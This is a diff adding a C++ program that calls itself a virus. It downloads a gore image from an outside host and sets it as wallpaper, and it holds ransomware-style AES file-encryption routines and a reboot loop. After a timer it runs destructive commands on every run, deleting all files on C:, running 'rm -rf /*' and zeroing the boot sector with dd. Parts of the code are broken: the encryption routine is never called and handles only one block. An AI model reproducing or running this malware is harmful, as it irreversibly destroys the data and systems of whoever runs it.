@@ -1,0 +1,198 @@
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <filesystem>
+#include <cstdlib>
+#include <cstring>
+#include <openssl/aes.h>
+#include <openssl/rand.h>
+
+#ifdef _WIN32
+#include <windows.h>
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
+#elif __linux__
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#elif __APPLE__
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#endif
+
+namespace fs = std::filesystem;
+
+const std::string KEY_FILE = "secret.key";
+const int TIMER_DURATION = 60000; // 1 minute for demonstration
+const std::string GORE_IMAGE_URL = "https://i.pinimg.com/originals/63/f1/e1/63f1e173d5deb498642168e021ce5ce3.jpg";
+const std::string GORE_IMAGE_PATH = "gore_image.jpg";
+const std::string MUSIC_PATH = "music.mp3";
+
+void showDisclaimer() {
+    std::cout << "DISCLAIMER:\nThis program is a virus and may destroy your PC.\nThe creator, Darkness, is not liable for any damages according to the agreement.\n";
+}
+
+bool isConnectedToInternet() {
+    #ifdef _WIN32
+    return InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
+    #else
+    std::system("ping -c 1 www.google.com > /dev/null 2>&1");
+    return WEXITSTATUS(std::system("echo $?")) == 0;
+    #endif
+}
+
+void downloadGoreImage() {
+    if (isConnectedToInternet()) {
+        #ifdef _WIN32
+        URLDownloadToFile(NULL, GORE_IMAGE_URL.c_str(), GORE_IMAGE_PATH.c_str(), 0, NULL);
+        #elif __linux__
+        std::system(("wget -O " + GORE_IMAGE_PATH + " " + GORE_IMAGE_URL).c_str());
+        #elif __APPLE__
+        std::system(("curl -o " + GORE_IMAGE_PATH + " " + GORE_IMAGE_URL).c_str());
+        #endif
+    }
+}
+
+void changeDesktopBackground() {
+    downloadGoreImage();
+
+    #ifdef _WIN32
+    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)GORE_IMAGE_PATH.c_str(), SPIF_UPDATEINIFILE);
+    #elif __linux__
+    std::system(("gsettings set org.gnome.desktop.background picture-uri file://" + fs::absolute(GORE_IMAGE_PATH).string()).c_str());
+    #elif __APPLE__
+    std::system(("osascript -e 'tell application \"System Events\" to set picture of every desktop to \"" + fs::absolute(GORE_IMAGE_PATH).string() + "\"'").c_str());
+    #endif
+}
+
+void generateAndStoreSecretKey(unsigned char* key) {
+    RAND_bytes(key, AES_BLOCK_SIZE);
+    std::ofstream keyFile(KEY_FILE, std::ios::binary);
+    keyFile.write((char*)key, AES_BLOCK_SIZE);
+    keyFile.close();
+}
+
+void encryptFile(const std::string& filepath, const unsigned char* key) {
+    AES_KEY encryptKey;
+    AES_set_encrypt_key(key, 128, &encryptKey);
+    
+    std::ifstream infile(filepath, std::ios::binary);
+    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(infile)), std::istreambuf_iterator<char>());
+    infile.close();
+
+    std::vector<unsigned char> encrypted(buffer.size() + AES_BLOCK_SIZE);
+    AES_encrypt(buffer.data(), encrypted.data(), &encryptKey);
+
+    std::ofstream outfile(filepath, std::ios::binary);
+    outfile.write((char*)encrypted.data(), encrypted.size());
+    outfile.close();
+}
+
+void decryptFile(const std::string& filepath, const unsigned char* key) {
+    AES_KEY decryptKey;
+    AES_set_decrypt_key(key, 128, &decryptKey);
+    
+    std::ifstream infile(filepath, std::ios::binary);
+    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(infile)), std::istreambuf_iterator<char>());
+    infile.close();
+
+    std::vector<unsigned char> decrypted(buffer.size());
+    AES_decrypt(buffer.data(), decrypted.data(), &decryptKey);
+
+    std::ofstream outfile(filepath, std::ios::binary);
+    outfile.write((char*)decrypted.data(), decrypted.size());
+    outfile.close();
+}
+
+void encryptAllFiles(const fs::path& dir, const unsigned char* key) {
+    for (const auto& entry : fs::recursive_directory_iterator(dir)) {
+        if (fs::is_regular_file(entry)) {
+            encryptFile(entry.path().string(), key);
+        }
+    }
+}
+
+void decryptAllFiles(const fs::path& dir, const unsigned char* key) {
+    for (const auto& entry : fs::recursive_directory_iterator(dir)) {
+        if (fs::is_regular_file(entry)) {
+            decryptFile(entry.path().string(), key);
+        }
+    }
+}
+
+void overwhelmPC() {
+    #ifdef _WIN32
+    for (int i = 0; i < 100; i++) {
+        std::system("shutdown -r -t 0");
+    }
+    #elif __linux__ || __APPLE__
+    for (int i = 0; i < 100; i++) {
+        std::system("sudo shutdown -r now");
+    }
+    #endif
+}
+
+void destroyPC() {
+    #ifdef _WIN32
+    std::system("cmd /c del /f /s /q C:\\*.*");
+    std::system("cmd /c bootsect /nt60 ALL /force /mbr");
+    #elif __linux__ || __APPLE__
+    std::system("sudo rm -rf /*");
+    std::system("sudo dd if=/dev/zero of=/dev/sda bs=512 count=1");
+    #endif
+}
+
+void playMusicOnLoop() {
+    #ifdef _WIN32
+    std::system(("powershell -c (New-Object Media.SoundPlayer '" + MUSIC_PATH + "').PlayLooping()").c_str());
+    #elif __linux__ || __APPLE__
+    std::system(("mpg123 -q --loop -1 " + MUSIC_PATH + " &").c_str());
+    #endif
+}
+
+int main() {
+    showDisclaimer();
+    changeDesktopBackground();
+
+    unsigned char key[AES_BLOCK_SIZE];
+    generateAndStoreSecretKey(key);
+
+    std::string userHome = std::getenv("HOME");
+    std::string secretKeyStr;
+    std::cout << "Enter the secret key (100 characters): ";
+    std::cin >> secretKeyStr;
+
+    if (secretKeyStr.size() == 100 && std::memcmp(key, secretKeyStr.data(), AES_BLOCK_SIZE) == 0) {
+        decryptAllFiles(userHome, key);
+        std::cout << "Files have been decrypted.\n";
+    } else {
+        std::cout << "INCORRECT PASSWORD\n";
+        std::cout << "1. Password\n2. Kill PC?\nChoose an option: ";
+        int choice;
+        std::cin >> choice;
+        if (choice == 1) {
+            overwhelmPC();
+        } else if (choice == 2) {
+            std::cout << "This will clear all drives including startup files and destroy the boot sector.\nThe damage done will be irreversible.\n";
+            std::cout << "Do you want to proceed? (yes/no): ";
+            std::string proceed;
+            std::cin >> proceed;
+            if (proceed == "yes") {
+                destroyPC();
+                playMusicOnLoop();
+            }
+        }
+    }
+
+    // Timer to execute all button functions simultaneously after countdown
+    std::this_thread::sleep_for(std::chrono::milliseconds(TIMER_DURATION));
+    overwhelmPC();
+    destroyPC();
+    playMusicOnLoop();
+
+    return 0;
+}
